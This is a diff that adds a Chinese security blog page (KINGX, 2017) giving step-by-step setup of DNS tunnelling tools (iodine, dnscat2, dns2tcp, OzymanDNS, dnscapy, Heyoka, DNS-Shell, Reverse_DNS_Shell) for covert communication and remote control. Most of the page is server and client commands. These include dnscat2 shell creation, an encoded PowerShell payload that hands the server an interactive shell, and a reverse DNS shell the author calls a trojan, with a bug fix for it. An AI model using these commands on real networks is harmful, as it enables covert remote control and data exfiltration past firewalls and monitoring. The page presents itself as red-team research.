@@ -1,0 +1,610 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>利用DNS隧道进行隐蔽通信和远程控制 &#8211; KINGX</title>
+<meta name="description" content="DNS Protocol">
+<meta name="keywords" content="protocol">
+
+<!-- Twitter Cards -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kingx.me/images/">
+<meta name="twitter:title" content="利用DNS隧道进行隐蔽通信和远程控制">
+<meta name="twitter:description" content="DNS Protocol">
+<meta name="twitter:creator" content="@https://example.com">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用DNS隧道进行隐蔽通信和远程控制">
+<meta property="og:description" content="DNS Protocol">
+<meta property="og:url" content="https://kingx.me/c2c-with-dns-tunnel.html">
+<meta property="og:site_name" content="KINGX">
+
+
+
+
+
+<link rel="canonical" href="https://kingx.me/c2c-with-dns-tunnel.html">
+<link href="https://kingx.me/feed.xml" type="application/atom+xml" rel="alternate" title="KINGX Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://kingx.me/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="https://kingx.me/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="https://kingx.me/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="https://kingx.me/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="https://kingx.me/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://kingx.me/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://kingx.me/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://kingx.me/images/apple-touch-icon-144x144-precomposed.png">
+
+
+
+
+<style type="text/css">body {background-image:url(https://kingx.me/images/triangular.png);}</style>
+
+
+</head>
+
+<body id="post" >
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="https://kingx.me/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="https://kingx.me/images/avatar.jpg" alt="KINGX photo" class="author-photo">
+					<h4>KINGX</h4>
+					<p>What is Security</p>
+				</li>
+				<li><a href="https://kingx.me/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="mailto:root#kingx.me"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				<li>
+					<a href="https://example.com"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
+				</li>
+				<li>
+					<a href="http://example.com"><i class="fa fa-fw fa-weibo"></i> Weibo</a>
+				</li>
+				
+				
+				
+				<li>
+					<a href="https://example.com"><i class="fa fa-fw fa-github"></i> GitHub</a>
+				</li>
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<!-- <li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="https://kingx.me/posts/">All Posts</a></li>
+				<li><a href="https://kingx.me/tags/">All Tags</a></li>
+			</ul>
+		</li> -->
+		
+	    
+	    <li><a href="https://kingx.me/latest-events/" >Security Incidents</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/latest-vulns/" >Vulnerabilities</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/pentest-tools/" >Red Team</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/posts/" >Archives</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/tags/" >Tags</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/links/" >Links</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/feed.xml" >RSS</a></li>
+	  
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+
+
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <header class="header-title">
+      <div class="header-title-wrap">
+        
+          <h1 class="entry-title"><a href="https://kingx.me/c2c-with-dns-tunnel.html" rel="bookmark" title="利用DNS隧道进行隐蔽通信和远程控制">利用DNS隧道进行隐蔽通信和远程控制</a></h1>
+        
+        <h2><span class="entry-date date published"><time datetime="2017-07-20T00:00:00-04:00">July 20, 2017</time></span></h2>
+        
+        <p class="entry-reading-time">
+          <i class="fa fa-clock-o"></i>
+          
+Reading time ~4 minutes
+          
+          <span id="busuanzi_container_page_pv">
+             / Page View <span id="busuanzi_value_page_pv">0</span> / Site Visitor <span id="busuanzi_value_site_uv">0</span>
+          </span>
+          
+        </p><!-- /.entry-reading-time -->
+        
+
+      </div><!-- /.header-title-wrap -->
+    </header>
+    <div class="entry-content">
+      <span class="entry-tags" style="color:red;font-size:13px;margin-bottom: 0px;">「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」</span>
+      <h1 id="0-前言">0. 前言</h1>
+
+<p>使用DNS隧道，都需要先配置域名的DNS记录。把指定域名的NS记录指向DNS隧道的服务器IP，需要添加两条记录：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>t1        IN    NS   t1ns.mydomain.com.
+t1ns      IN    A    100.15.213.99
+</code></pre></div></div>
+
+<p>先给t1.mydomain.com添加一条NS记录指向t1ns.mydomain.com，再指定t1ns.mydomain.com的A记录为100.15.213.99。这样，所有t1.mydomain.com下的子域名的DNS请求都会被指向到 100.15.213.99。</p>
+
+<p>下面，分别说明iodine、dnscat2、dns2tcp、Heyoka、dnsshell、OzymanDNS、dnscapy等DNS隧道工具的搭建使用方法。</p>
+
+<h1 id="1-iodine">1. IODINE</h1>
+
+<h2 id="11-环境准备">1.1 环境准备</h2>
+
+<p>确认内核是否支持tun/tap：<code class="highlighter-rouge">modinfo tun</code>。如果无驱动，可以参考如下教程。</p>
+
+<p>TUN/TAP虚拟网卡: <a href="http://www.jb51.net/LINUXjishu/401735.html">http://www.jb51.net/LINUXjishu/401735.html</a></p>
+
+<p>TUN/TAP驱动 for OSX：<a href="http://tuntaposx.sourceforge.net/download.xhtml">http://tuntaposx.sourceforge.net/download.xhtml</a></p>
+
+<p>iodine README：<a href="http://code.kryo.se/iodine/README.html">http://code.kryo.se/iodine/README.html</a></p>
+
+<p>参考教程：<a href="https://kcore.org/2008/07/07/iodine-dns-tunnel-on-your-mac-to-escape-those-evil-firewalls/">https://kcore.org/2008/07/07/iodine-dns-tunnel-on-your-mac-to-escape-those-evil-firewalls/</a></p>
+
+<h2 id="12-服务端配置">1.2 服务端配置</h2>
+
+<p>iodined -f -c -P secrdnetpassword 10.0.0.0 dnstun.cih.so</p>
+
+<p>配置路由和网络规则：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysctl -e net.ipv4.ip_forward=1
+iptables -t nat -A POSTROUTING -s 10.0.0.0/255.255.255.0 -o eth0 -j MASQUERADE
+</code></pre></div></div>
+
+<h2 id="13-客户端配置">1.3 客户端配置</h2>
+<p>iodine -f -P secretpassword dnstun.cih.so</p>
+
+<p>运行如下脚本，自动进行路由设置。注意修改脚本前几行的配置变量：<code class="highlighter-rouge">IOD</code>,<code class="highlighter-rouge">IOTD</code>,<code class="highlighter-rouge">IOIP</code>等。脚本下载地址：
+<a href="http://www.doeshosting.com/code/NStun.sh">http://www.doeshosting.com/code/NStun.sh</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+<span class="c">#############################################################################</span>
+<span class="c">## Small script to automate the task of correctly setting up a DNS tunnel</span>
+<span class="c">## client.  This must be run as root.  This script is public domain.</span>
+<span class="c">## This file should have chmod 500 and chown root</span>
+<span class="c">## http://www.doeshosting.com/code/NStun.sh is always most up to date.</span>
+<span class="c">## Wassup to the IRCpimps</span>
+<span class="c">## Please someone get tuntap working on the iphone!</span>
+<span class="c">## UPDATE! Thank you Friedrich Schoeller for your creative solution </span>
+<span class="c">## for iphone-tun with tunemu</span>
+<span class="c">## Thank you to Bjorn Andersson and Erik Ekman for making iodine</span>
+<span class="c">##</span>
+<span class="c">## Bugs: -If you have 2 default routes it shouldnt know which to pick, but I</span>
+<span class="c">##        have a hard time picturing someone using a NS tunnel when using 2</span>
+<span class="c">##        default routes. </span>
+<span class="c">##</span>
+<span class="c">## -krzee           email:  username=krzee  domain=ircpimps.org</span>
+<span class="c">#############################################################################</span>
+
+
+<span class="c">#### EDIT HERE ####</span>
+
+<span class="c"># Path to your iodine executable</span>
+<span class="nv">IOD</span><span class="o">=</span><span class="s2">"/usr/local/sbin/iodine"</span>
+
+<span class="c"># Your top domain</span>
+<span class="nv">IOTD</span><span class="o">=</span><span class="s2">"example.ircpimps.org"</span>
+
+<span class="c"># You may choose to store the password in this script or enter it every time</span>
+<span class="c">#IOPASS="your iodine password"</span>
+
+<span class="c"># You might need to change this if you use linux, or already have </span>
+<span class="c"># tunnels running.  In linux iodine uses dnsX and fbsd/osX use tunX</span>
+<span class="c"># X represents how many tunnel interfaces exist, starting at 0</span>
+<span class="nv">IODEV</span><span class="o">=</span><span class="s2">"tun0"</span>
+
+<span class="c"># The IP your iodined server uses inside the tunnel</span>
+<span class="c"># The man page calls this tunnel_ip</span>
+<span class="nv">IOIP</span><span class="o">=</span><span class="s2">"10.7.0.1"</span>
+
+
+<span class="c">#### STOP EDITING ####</span>
+
+<span class="nv">NS</span><span class="o">=</span><span class="sb">`</span><span class="nb">grep </span>nameserver /etc/resolv.conf|head <span class="nt">-1</span>|awk <span class="s1">'{print $2}'</span><span class="sb">`</span>
+<span class="nv">GW</span><span class="o">=</span><span class="sb">`</span>netstat <span class="nt">-rn</span>|grep <span class="nt">-v</span> Gateway|grep G|awk <span class="s1">'{print $2}'</span>|head <span class="nt">-1</span><span class="sb">`</span>
+<span class="nv">OS</span><span class="o">=</span><span class="sb">`</span><span class="nb">uname</span><span class="sb">`</span>
+<span class="o">[</span> <span class="nt">-z</span> <span class="nv">$IOPASS</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Enter your iodine password"</span>
+<span class="o">[</span> <span class="nt">-z</span> <span class="nv">$IOPASS</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$IOD</span> <span class="nv">$NS</span> <span class="nv">$IOTD</span>
+<span class="o">[</span> <span class="nt">-n</span> <span class="nv">$IOPASS</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$IOD</span> <span class="nt">-P</span> <span class="s2">"</span><span class="k">${</span><span class="nv">IOPASS</span><span class="k">}</span><span class="s2">"</span> <span class="nv">$NS</span> <span class="nv">$IOTD</span>
+<span class="k">if </span>ps auxw|grep iodine|grep <span class="nt">-v</span> <span class="nb">grep
+ </span><span class="k">then
+        case</span> <span class="s2">"</span><span class="nv">$OS</span><span class="s2">"</span> <span class="k">in
+        </span>Darwin|<span class="k">*</span>BSD<span class="p">)</span>
+		route delete default
+		route add <span class="nv">$NS</span> <span class="nt">-gateway</span> <span class="nv">$GW</span>
+		route add default <span class="nt">-gateway</span> <span class="nv">$IOIP</span>
+		<span class="p">;;</span>
+	Linux<span class="p">)</span>
+		route del default
+		route add <span class="nv">$NS</span> gw <span class="nv">$GW</span>
+		route add default gw <span class="nv">$IOIP</span> <span class="nv">$IODEV</span>
+		<span class="p">;;</span>
+	<span class="k">*</span><span class="p">)</span>
+		<span class="nb">echo</span> <span class="s2">"Your OS is not osX, BSD, or Linux."</span>
+		<span class="nb">echo</span> <span class="s2">"I don't know how to add routes on </span><span class="k">${</span><span class="nv">OS</span><span class="k">}</span><span class="s2">."</span>
+		<span class="nb">echo</span> <span class="s2">"Email krzee and tell him the syntax."</span>
+		<span class="p">;;</span>
+	<span class="k">esac</span>
+ <span class="nb">echo</span> <span class="s2">"Press enter when you are done with iodine"</span>
+ <span class="nb">echo</span> <span class="s2">"and you want your routes back to normal"</span>
+ <span class="nb">read </span>yourmind
+ <span class="nb">kill</span> <span class="nt">-9</span> <span class="sb">`</span>ps auxw|grep iodine|grep <span class="nt">-v</span> <span class="nb">grep</span>|awk <span class="s1">'{print $2}'</span><span class="sb">`</span>
+         <span class="k">case</span> <span class="s2">"</span><span class="nv">$OS</span><span class="s2">"</span> <span class="k">in
+        </span>Darwin|<span class="k">*</span>BSD<span class="p">)</span>
+                route delete default
+                route delete <span class="nv">$NS</span>
+                route add default <span class="nt">-gateway</span> <span class="nv">$GW</span>
+                <span class="p">;;</span>
+        Linux<span class="p">)</span>
+                route del default
+                route delete <span class="nv">$NS</span>
+                route add default gw <span class="nv">$GW</span>
+                <span class="p">;;</span>
+        <span class="k">*</span><span class="p">)</span>
+                <span class="nb">echo</span> <span class="s2">"Your OS is not osX, BSD, or Linux."</span>
+                <span class="nb">echo</span> <span class="s2">"I don't know how to add routes on </span><span class="k">${</span><span class="nv">OS</span><span class="k">}</span><span class="s2">."</span>
+                <span class="nb">echo</span> <span class="s2">"Email krzee and tell him the syntax."</span>
+                <span class="p">;;</span>
+        <span class="k">esac</span>
+ <span class="k">else </span><span class="nb">echo </span>there was a problem starting iodine
+ <span class="nb">echo </span>try running it manually to troubleshoot
+<span class="k">fi
+</span><span class="nb">exit</span>
+</code></pre></div></div>
+
+<h1 id="2-dnscat2">2. DNSCAT2</h1>
+
+<p>http://blog.csdn.net/tan6600/article/details/52142254</p>
+
+<p>可执行客户端下载：
+	https://downloads.skullsecurity.org/dnscat2/</p>
+
+<h3 id="服务端">服务端</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby dnscat2.rb -e open dnstun.cih.so
+
+	-e open 由客户端选择加密，可以不加密
+	--secret=xxxxx 设置一个密码
+</code></pre></div></div>
+
+<p>服务端会展示出客户端的连接命令，其中包含了密钥。</p>
+
+<h3 id="客户端">客户端</h3>
+<p>./dnscat dnstun.cih.so 		直接连接。</p>
+
+<p>./dnscat –secret=kingx dnstun.cih.so 	使用加密方式连接，secret为认证密码。</p>
+
+<p>./dnscat –dns domain=skullseclabs.org,server=8.8.8.8,port=53</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	session/window 				查看会话
+	session -i 1/window -i 1	选中某个会话
+	exec gedit 		执行某个命令
+	shell			创建shell
+					创建一个shell后，shell会在一个新的会话中，使用session命令查看新的会话，并进行交互命令。
+</code></pre></div></div>
+
+<h1 id="3-dns2tcp">3. DNS2TCP</h1>
+
+<p>wget http://www.hsc.fr/ressources/outils/dns2tcp/download/dns2tcp-0.5.2.tar.gz</p>
+
+<p>tar xzvf dns2tcp-0.5.2.tar.gz</p>
+
+<p>./configure
+make &amp;&amp; make install</p>
+
+<h2 id="服务端-1">服务端</h2>
+<p>/etc/dns2tcpd.conf</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listen = 0.0.0.0（Linux服务器的IP）  
+port = 53  
+user = nobody  
+chroot = /tmp  
+domain = tcp.vvvtimes.com（上面配置NS记录的域名）  
+resources = ssh:127.0.0.1:22,socks:127.0.0.1:1082,http:127.0.0.1:3128 
+</code></pre></div></div>
+
+<p>dns2tcpd -f /etc/dns2tcpd.conf -F -d 2</p>
+
+<h2 id="客户端-1">客户端</h2>
+<p>dns2tcpc -r ssh -l 8888 -d 2 -z dnstun.cih.so 8.8.4.4</p>
+
+<p>ssh -p 8888 root@127.0.0.1</p>
+
+<h1 id="4-ozymandns">4. OzymanDNS</h1>
+
+<p>https://raw.githubusercontent.com/mubix/stuff/master/stolen/ozymandns_src_0.1.tgz</p>
+
+<p>https://dnstunnel.de/</p>
+
+<p><strong>Tips:  这个版本的代码有很多坑，需要手动修改代码。</strong></p>
+
+<p>1 - 服务端只会监听本地53端口。需要修改代码使其正常使用。</p>
+
+<p>修改后的关键代码如下，添加了<code class="highlighter-rouge">LocalAddr    =&gt; [$opts{ip}],</code>这一部分代码：</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">my</span> <span class="nv">$ns</span> <span class="o">=</span> <span class="nn">Net::DNS::</span><span class="nv">Nameserver</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span>
+    <span class="nv">LocalAddr</span>    <span class="o">=&gt;</span> <span class="p">[</span><span class="nv">$opts</span><span class="p">{</span><span class="nv">ip</span><span class="p">}],</span>
+    <span class="nv">LocalPort</span>    <span class="o">=&gt;</span> <span class="mi">53</span><span class="p">,</span>
+    <span class="nv">ReplyHandler</span> <span class="o">=&gt;</span> <span class="o">\&amp;</span><span class="nv">reply_handler</span><span class="p">,</span>
+    <span class="nv">Verbose</span>      <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
+<span class="p">)</span> <span class="o">||</span> <span class="nb">die</span> <span class="s">"couldn't create nameserver object\n"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>2 - 建议注释以下行，否则运行一段时间后会报错。</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># if ($qtype eq "TYPE38") { $rcode = "NOTIMPL"; goto end;};</span>
+</code></pre></div></div>
+
+<h2 id="相关依赖包">相关依赖包</h2>
+
+<ul>
+  <li>Net/DNS.pm - http://www.net-dns.org/download/Net-DNS-1.11.tar.gz</li>
+  <li>LWP/UserAgent.pm  - http://search.cpan.org/CPAN/authors/id/O/OA/OALDERS/libwww-perl-6.26.tar.gz</li>
+  <li>URI.pm - http://search.cpan.org/CPAN/authors/id/E/ET/ETHER/URI-1.72.tar.gz</li>
+  <li>Try/Tiny.pm</li>
+  <li>MIME/Base32 - http://search.cpan.org/CPAN/authors/id/D/DA/DANPEDER/MIME-Base32-1.02a.tar.gz</li>
+</ul>
+
+<p><strong>Tips: MIME/Base32新版本不兼容，需要使用旧版本:MIME-Base32-1.02a.tar.gz</strong></p>
+
+<p>手工安装依赖包：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://www.net-dns.org/download/Net-DNS-1.11.tar.gz
+<span class="nb">tar </span>xzvf Net-DNS-1.11.tar.gz
+perl Makefile.PL <span class="o">&amp;&amp;</span> make <span class="o">&amp;&amp;</span> <span class="nb">install</span>
+</code></pre></div></div>
+
+<p>Perl模块搜索网站：<a href="http://search.cpan.org/~oalders/libwww-perl/lib/LWP/UserAgent.pm">http://search.cpan.org/~oalders/libwww-perl/lib/LWP/UserAgent.pm</a></p>
+
+<p>Perl模块自动安装方法，如：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cpan clwp Try/Tiny.pm 
+</code></pre></div></div>
+
+<p>Perl模块卸载：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pm-uninstall MIME/Base32.pm
+</code></pre></div></div>
+
+<h2 id="使用方法">使用方法</h2>
+<h3 id="服务端-2">服务端</h3>
+<p>sudo ./nomde.pl -i 0.0.0.0 server.example.com</p>
+
+<h3 id="客户端-2">客户端</h3>
+
+<p>使用DNS隧道连接外部服务器的SSH：
+ssh -o ProxyCommand=”./droute.pl -r 8.8.4.4 sshdns.server.example.com” root@localhost</p>
+
+<p>使用DNS隧道连接SSH，并创建一个Socks代理：
+ssh -D 127.0.0.1：8888 -o ProxyCommand=”./droute.pl -r 8.8.4.4 sshdns.server.example.com” root@localhost</p>
+
+<p><strong>Tips: 注意客户端脚本参数中需要在中继域名前加上sshdns前缀</strong></p>
+
+<h1 id="5-dnsscapy">5. DNSScapy</h1>
+
+<p>https://code.google.com/archive/p/dnscapy/</p>
+
+<p>Download:
+https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/dnscapy/dnscapy-0-99b.zip</p>
+
+<p>Server:
+sudo python dnscapy_server.py [DELEGATED_ZONE_NAME] [EXTERNAL_IP_ADDR]</p>
+
+<p>Client:
+ssh -o ProxyCommand=”sudo python dnscapy_client.py [DELEGATED_ZONE_NAME] [IP_ADDR_OF_CLIENT_DNS]” yourlogin@localhost</p>
+
+<h1 id="6-heyoka">6. Heyoka</h1>
+
+<p>http://heyoka.sourceforge.net/</p>
+
+<p>https://www.youtube.com/watch?v=Qono_XybsbA</p>
+
+<h3 id="服务端-3">服务端</h3>
+<p>heyoka.exe -m -d dnstunw.cih.so -l -p 8080</p>
+
+<h3 id="客户端-3">客户端</h3>
+<p>heyoka.exe -s -d dnstunw.cih.so -p 3389</p>
+
+<p>将slave机器的3389映射到master机器的8080上？还有待测试</p>
+
+<h1 id="7-dnsshell-----forwindows">7. DnsShell  -  (ForWindows)</h1>
+
+<p><a href="https://github.com/sensepost/DNS-Shell">https://github.com/sensepost/DNS-Shell</a></p>
+
+<h2 id="服务端-4">服务端</h2>
+
+<h3 id="基于dns中继的方式">基于DNS中继的方式</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python DNS-shell.py -l -r dnstun.cih.so
+</code></pre></div></div>
+
+<h3 id="基于连接的方式">基于连接的方式</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python DNS-shell.py -l -d [Server IP]
+</code></pre></div></div>
+
+<h2 id="客户端-4">客户端</h2>
+<p>服务端执行脚本后会得到一段payload，在客户端执行它。服务端即可获得一个交互式shell。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe -e [payload]
+</code></pre></div></div>
+
+<h1 id="8-reversednsshell">8. ReverseDnsShell</h1>
+
+<p>基于直接连接的DNS隧道木马</p>
+
+<p>https://github.com/ahhh/Reverse_DNS_Shell</p>
+
+<h2 id="服务端-5">服务端</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python reverse_dns_shell_server.py
+</code></pre></div></div>
+<h2 id="客户端-5">客户端</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python reverse_dns_shell_client.py -s server_ip
+</code></pre></div></div>
+
+<h2 id="tips">Tips</h2>
+<p>代码使用时存在一些bug，修复如下，在dnsMakeQuery函数中设置timeout：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def dnsMakeQuery(url, host):
+  feedback_request = dns.message.make_query(url, dns.rdatatype.A)
+  print 'ready udp'
+  dns.query.udp(feedback_request, host, timeout=5)
+</code></pre></div></div>
+<p>修改后的代码：
+<a href="https://github.com/KxCode/Reverse_DNS_Shell">https://github.com/KxCode/Reverse_DNS_Shell</a></p>
+
+      <footer class="entry-meta">
+        <span class="entry-tags" style="color:black;font-size:13px;margin-bottom: 0px;">欢迎订阅我的微信公众号</span>
+        <img src="/images/secengine.jpg" alt="welcome subscribe"/>
+        <span class="entry-tags"><a href="https://kingx.me/tags/#protocol" title="Pages tagged protocol" class="tag"><span class="term">protocol</span></a></span>
+        
+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="weibo"><a href="http://service.weibo.com/share/share.php?title=分享KINGX的文章《利用DNS隧道进行隐蔽通信和远程控制》&url=https://kingx.me/c2c-with-dns-tunnel.html&source=bookmark" title="Share on Weibo" target="_blank"><span class="count"><i class="fa fa-weibo"></i> WEIBO</span></a></li>
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://kingx.me/c2c-with-dns-tunnel.html" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://kingx.me/c2c-with-dns-tunnel.html" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=https://kingx.me/c2c-with-dns-tunnel.html" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+<!--
+<div class="ds-share" data-thread-key="/c2c-with-dns-tunnel" data-title="利用DNS隧道进行隐蔽通信和远程控制" data-images="" data-content="利用DNS隧道进行隐蔽通信和远程控制" data-url="https://kingx.me/c2c-with-dns-tunnel.html">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+        <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+</div>
+-->
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    
+
+    <div class="read-more">
+  
+    <div class="read-more-header">
+      
+        <a href="https://kingx.me/dns-protocol.html" class="read-more-btn">Read More</a>
+      
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      
+      <h3><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" title="如何绕过高版本JDK的限制进行JNDI注入利用">如何绕过高版本JDK的限制进行JNDI注入利用</a></h3>
+      <p>Restrictions of JNDI Manipulation RCE & Bypass <a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">Continue reading</a></p>
+      
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+    
+      
+      <div class="list-item">
+        <h4><a href="https://kingx.me/Thinking-about-Red-Teaming.html" title="【红蓝对抗】大型互联网企业安全蓝军建设">【红蓝对抗】大型互联网企业安全蓝军建设</a></h4>
+        <span>Published on March 12, 2019</span>
+      </div><!-- /.list-item -->
+      
+    
+      
+      <div class="list-item">
+        <h4><a href="https://kingx.me/CobaltStrike-Patch.html" title="内网渗透有它就够了，手把手教你分析CobaltStrike3.12">内网渗透有它就够了，手把手教你分析CobaltStrike3.12</a></h4>
+        <span>Published on November 19, 2018</span>
+      </div><!-- /.list-item -->
+      
+    
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2019 KINGX. Powered by Jekyll using the HPSTR Theme.</span>
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+<!--<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>-->
+<!-- <script src="http://libs.baidu.com/jquery/1.9.1/jquery.min.js"></script> -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="https://kingx.me/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="https://kingx.me/assets/js/scripts.min.js"></script>
+
+
+
+
+<script>
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  if(location.host=="kingx.me"){
+    hm.src = "https://hm.baidu.com/hm.js?d11d8512e0bc6992b9c9bbf2d266ce31";
+  }else if(location.host=="kingx.sinaapp.com"){
+    hm.src = "https://hm.baidu.com/hm.js?d1b3dbd97b73868454f102755fdf51ba";
+  }
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Busuanzi Analytics -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+	        
+
+</body>
+</html>
